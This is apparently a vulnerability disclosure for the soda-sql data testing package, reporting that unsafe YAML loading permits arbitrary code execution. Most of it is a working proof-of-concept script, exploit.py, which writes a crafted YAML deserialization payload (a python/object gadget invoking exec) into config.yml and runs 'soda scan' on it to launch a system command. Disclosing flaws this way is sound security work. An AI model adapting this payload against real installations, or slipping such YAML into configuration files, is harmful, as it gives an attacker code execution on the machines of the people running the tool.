# Description

`soda-sql` Metric collection, data testing and monitoring for SQL accessible data, which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip3 install soda-sql
```

### Run exploit.py
```
import os
#os.system('pip3 install soda-sql)
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
os.system('soda scan config.yml config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
